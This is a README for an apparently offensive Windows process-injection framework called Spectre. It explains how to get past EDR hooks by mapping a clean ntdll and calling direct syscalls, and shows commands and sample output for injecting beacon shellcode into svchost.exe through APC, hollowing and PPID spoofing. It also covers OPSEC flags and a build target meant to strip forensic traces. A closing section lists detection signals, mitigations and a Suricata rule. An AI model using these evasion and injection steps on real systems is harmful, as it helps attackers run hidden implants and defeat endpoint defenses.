<!-- Banner: .github/banner.png — Style A (p0dalirius): fond noir, wireframe font, ~2400×400px
     Style B (ShutdownRepo): fond blanc, icône + bold sans-serif, si outil moins offensif -->
![](./.github/banner.png)

<div align="center">

# Spectre

**Process injection framework** — APC, hollowing, and threadless injection via direct syscalls and NTDLL unhooking.

[![CI](https://github.com/franckferman/spectre/actions/workflows/ci.yml/badge.svg?branch=stable)](https://github.com/franckferman/spectre/actions/workflows/ci.yml)
[![C](https://img.shields.io/badge/C-C11-00599C?style=flat-square&logo=c&logoColor=white)]()
[![License](https://img.shields.io/badge/license-AGPL--3.0-blue?style=flat-square)](LICENSE)

</div>

> [!IMPORTANT]
> Requires `SeDebugPrivilege` or a high-integrity context. Does not bundle or generate shellcode — bring your own PIC payload.

<!-- Blog post companion (itm4n pattern): uncomment if one exists
For a detailed breakdown of the technique and design decisions: [Direct Syscalls and the Fresh-NTDLL Approach](https://franckferman.fr/blog/spectre)
-->

---

## Table of Contents

1. [Overview](#1-overview)
2. [How It Works](#2-how-it-works)
3. [Compared to Alternatives](#3-compared-to-alternatives)
4. [MITRE ATT&CK](#4-mitre-attck)
5. [Build](#5-build)
6. [Usage](#6-usage)
7. [Flag Reference](#7-flag-reference)
8. [Examples](#8-examples)
9. [Project Structure](#9-project-structure)
10. [Compatibility](#10-compatibility)
11. [Detection and Mitigation](#11-detection-and-mitigation)
12. [References](#12-references)
13. [License](#13-license)

---

## 1. Overview

Spectre is a process injection framework written in C that implements APC queue injection, process hollowing, and threadless injection — all routed through direct syscalls rather than the hooked user-mode `ntdll.dll`.

It was built to replace ad-hoc `VirtualAllocEx + WriteProcessMemory + CreateRemoteThread` chains that EDRs flag at the API layer before any shellcode executes. Spectre maps a clean copy of `ntdll.dll` from disk, extracts raw syscall stubs, and dispatches through a local trampoline — the hooks installed by the EDR are never reached.

**What it does not do:** Spectre is a delivery mechanism only. It does not generate shellcode, stage payloads, or provide C2 capability.

---

## 2. How It Works

### Injection pipeline

```
Operator                    Spectre                         Target process
   |                           |                                  |
   |-- spectre.exe             |                                  |
      --pid 1284               |                                  |
      --mode apc               |                                  |
      --payload beacon.bin --->|                                  |
                               |-- NtAllocateVirtualMemory ------>| (direct syscall)
                               |-- NtWriteVirtualMemory --------->| (shellcode written)
                               |-- NtProtectVirtualMemory ------->| (rw -> rx)
                               |-- NtQueueApcThread ------------->| (APC queued)
                               |                                  |-- fires on alertable wait
```

### NTDLL unhooking

EDRs patch the first bytes of `ntdll.dll` syscall stubs in-process with `JMP <hook>`. Spectre loads a second clean copy from disk via `CreateFileMapping` + `MapViewOfFile`, extracts the unpatched stub, copies it into a local trampoline, and calls it directly. The EDR's in-memory image is never touched.

```c
// Map a fresh ntdll from disk — the on-disk image is never modified by EDRs
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMap  = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
// Walk export table, copy stub for target function into local trampoline buffer
```

### APC vs CreateRemoteThread

`CreateRemoteThread` is the most-instrumented injection call in existence. APC injection queues shellcode as an Asynchronous Procedure Call on an existing thread; it fires the next time the thread enters an alertable wait (`SleepEx`, `WaitForSingleObjectEx`). No new thread is created. `svchost.exe` threads call `SleepEx` routinely — they are reliable targets. GUI processes (`notepad.exe`) use `GetMessage`, which is non-alertable; Spectre falls back to `--mode hollow` automatically on timeout.

---

## 3. Compared to Alternatives

| | Manual CRT | Cobalt Strike | Spectre |
|---|---|---|---|
| **Syscall route** | Hooked ntdll | Hooked ntdll | Clean disk copy |
| **Thread creation** | `CreateRemoteThread` | `NtCreateThreadEx` | APC — no new thread |
| **Memory perms** | `rwx` | `rw` → `rx` (profile) | `rw` → `rx`, never `rwx` |
| **EDR hook bypass** | No | No | Yes — trampoline from clean stub |
| **Detection surface** | CRT + rwx alloc | CS watermark in shellcode | No fixed syscall sequence |

---

## 4. MITRE ATT&CK

| Technique | ID | Mode |
|---|---|---|
| Process Injection: APC Injection | [T1055.004](https://attack.mitre.org/techniques/T1055/004/) | `--mode apc` |
| Process Injection: Process Hollowing | [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | `--mode hollow` |
| Process Injection: Thread Hijacking | [T1055.003](https://attack.mitre.org/techniques/T1055/003/) | `--mode hijack` |
| Defense Evasion: Masquerading | [T1036](https://attack.mitre.org/techniques/T1036/) | Hollowing preserves process name |
| Defense Evasion: Indirect Command Execution | [T1202](https://attack.mitre.org/techniques/T1202/) | Threadless vtable overwrite |

---

## 5. Build

**Requirements:** MSVC 2019+ or MinGW-w64.

```powershell
# MSVC (x64 Developer Command Prompt)
nmake /f Makefile.nmake release
```

```bash
# MinGW cross-compile from Linux
make CC=x86_64-w64-mingw32-gcc release
```

| Target | Description |
|---|---|
| `make debug` | Debug symbols, verbose syscall trace |
| `make release` | Stripped, LTCG, no debug output |
| `make ghost` | `release` + zeroed PDB path + randomized timestamp |
| `make xcompile-linux` | MinGW cross-compile from Linux |

---

## 6. Usage

```
spectre.exe --pid <PID> --payload <file.bin> [options]
spectre.exe --name <process> --payload <file.bin> [options]
```

### Use Case 1 (Red Team): Silent APC injection, no new thread

```powershell
spectre.exe --name svchost.exe --payload beacon.bin --mode apc --no-rwx --sleep 5000 --jitter 20
```

### Use Case 2 (Evasion research): Compare syscall resolution modes

```powershell
# Default: clean ntdll copy from disk
spectre.exe --pid 1234 --payload stage.bin --syscall-mode fresh-ntdll

# Hell's Gate: extract SSN from live in-memory ntdll
spectre.exe --pid 1234 --payload stage.bin --syscall-mode hells-gate
```

### Use Case 3 (Lab): Debug build with full syscall trace

```powershell
spectre.exe --pid 1234 --payload calc_x64.bin --mode apc -v
```

---

## 7. Flag Reference

### Core

| Flag | Default | Description |
|---|---|---|
| `--pid <N>` | — | Target PID. Mutually exclusive with `--name`. |
| `--name <str>` | — | Target process by name (first match). |
| `--payload <path>` | — | Raw PIC shellcode (`.bin`). |
| `--mode <mode>` | `apc` | `apc` / `hollow` / `hijack` / `threadless` |

### OPSEC

| Flag | Default | Description |
|---|---|---|
| `--no-rwx` | on in release | Never allocate `rwx`. Write `rw`, flip to `rx`. |
| `--sleep <ms>` | `0` | Pre-injection sleep. |
| `--jitter <pct>` | `0` | ±% jitter on sleep. |
| `--syscall-mode` | `fresh-ntdll` | `fresh-ntdll` / `hells-gate` / `syswhispers` |
| `--quiet` | off | Suppress stdout. |
| `-v` | off | Verbose: print each syscall dispatched. |

### Hollowing

| Flag | Default | Description |
|---|---|---|
| `--parent <name>` | `svchost.exe` | Sacrificial process to spawn + hollow. |
| `--ppid <N>` | — | PPID spoof — process appears under this parent in Task Manager. |

---

## 8. Examples

```
C:\Tools>spectre.exe --name svchost.exe --payload beacon.bin --mode apc -v
[*] Resolving stubs from clean ntdll copy...
[+] NtAllocateVirtualMemory  SSN=0x18
[+] NtWriteVirtualMemory     SSN=0x3a
[+] NtProtectVirtualMemory   SSN=0x50
[*] Target: svchost.exe (PID 1284, TID 5632 — alertable)
[+] Allocated 4096 bytes at 0x1e3a0000000 (rw)
[+] Shellcode written (312 bytes), permission: rx
[+] APC queued on TID 5632. Done.
```

```
C:\Tools>spectre.exe --hollow --parent svchost.exe --ppid 3120 --payload rev.bin
[*] Spoofing parent to PID 3120 (explorer.exe)
[+] svchost.exe created suspended (PID 7744)
[+] Original PE unmapped, payload mapped at ImageBase
[+] EP redirected, thread resumed.
```

---

## 9. Project Structure

```
spectre/
├── src/
│   ├── main.c              CLI parsing, dispatch
│   ├── inject/
│   │   ├── apc.c           APC — alertable thread scan, NtQueueApcThread
│   │   ├── hollow.c        Hollowing — unmap, remap, redirect EP
│   │   └── threadless.c    Vtable overwrite — COM/RPC function pointer
│   ├── syscall/
│   │   ├── fresh.c         Fresh-ntdll — disk map, RVA walk, stub copy
│   │   ├── hells_gate.c    Hell's Gate — in-memory SSN extraction
│   │   └── trampoline.asm  64-bit syscall stub template
│   └── util/
│       ├── pe.c            Export table walker
│       └── proc.c          Process/thread enumeration
├── include/
│   ├── spectre.h
│   └── ntdefs.h            NT native API typedefs absent from the SDK
├── Makefile
├── Makefile.nmake
└── tests/
    ├── test_fresh_ntdll.c
    └── test_apc.c
```

---

## 10. Compatibility

| Windows | APC | Hollowing | Threadless | Notes |
|---|:---:|:---:|:---:|---|
| 10 22H2 (19045) | ✔ | ✔ | ✔ | |
| 11 22H2 (22621) | ✔ | ✔ | ⚠ | Threadless fails on CFG-enabled processes |
| 11 24H2 (26100) | ⚠ | ✔ | ⚠ | Use `--syscall-mode hells-gate` with Secure Boot + VBS |
| Server 2019/2022 | ✔ | ✔ | ✔ | |

---

## 11. Detection and Mitigation

### EDR signals

| Signal | Technique | Confidence |
|---|---|---|
| `ntdll.dll` mapped twice in same process | fresh-ntdll | High |
| `NtQueueApcThread` from non-system module | APC | Medium (requires kernel callbacks) |
| ETW-TI: `EtwTiLogAllocExVm` + `EtwTiLogWriteVm` sequence | All | Medium |
| CFG violation on vtable call | Threadless | High (CFG-protected targets only) |
| Abnormal parent-child tree (PPID spoof) | Hollowing | Low (image load events required) |

### Mitigation

| Control | Covers |
|---|---|
| ACG on target process | Blocks `rw` → `rx` flip; APC and hollow fail |
| CFG/CFI on target binary | Blocks threadless vtable overwrite |
| ETW-TI + EDR kernel callbacks | Catches alloc/write/APC sequence |
| Double-mapped ntdll scan | Detects fresh-ntdll mode specifically |

### Suricata (C2 network layer)

```
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Injected beacon — HTTP C2 staging pattern";
  flow:established,to_server;
  content:"GET /"; depth:5;
  pcre:"/User-Agent: [A-Za-z]{4,8}\/[0-9]\.[0-9]\r\n\r\n$/";
  threshold: type both, track by_src, count 5, seconds 300;
  sid:9000010; rev:1;
)
```

---

## 12. References

| Source | Relevance |
|---|---|
| [Hell's Gate — am0nsec, smelly__vx (2020)](https://github.com/am0nsec/HellsGate) | SSN extraction — `--syscall-mode hells-gate` |
| [SysWhispers3 — klezVirus (2022)](https://github.com/klezVirus/SysWhispers3) | Pre-baked stubs — `--syscall-mode syswhispers` |
| [Threadless Injection — CCob (2023)](https://github.com/CCob/ThreadlessInject) | Vtable overwrite primitive |
| [Early Bird APC — CyberArk (2018)](https://www.cyberark.com/resources/threat-research-blog/masking-malicious-memory-artifacts-part-ii-insights-from-moneta) | APC-before-main-thread variant |
| [MITRE T1055.004](https://attack.mitre.org/techniques/T1055/004/) | APC injection |
| [Windows Internals 7th ed.](https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals) | APC/alertable wait internals, ETW-TI |

---

## 13. License

Licensed under the **GNU Affero General Public License v3.0**.
See [LICENSE](LICENSE) for full terms.

---

## Credits

- [@am0nsec](https://twitter.com/am0nsec) & [@RtlMateusz](https://twitter.com/RtlMateusz) — Hell's Gate VX technique
- [@klezVirus](https://twitter.com/klezVirus) — SysWhispers3 pre-baked stubs
- [@CCob](https://twitter.com/CCob) — threadless injection research

---

## Contact

[![ProtonMail](https://img.shields.io/badge/ProtonMail-8B89CC?style=flat-square&logo=protonmail&logoColor=white)](mailto:contact@franckferman.fr)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/franckferman)
[![X](https://img.shields.io/badge/X-000000?style=flat-square&logo=x&logoColor=white)](https://www.twitter.com/franckferman)
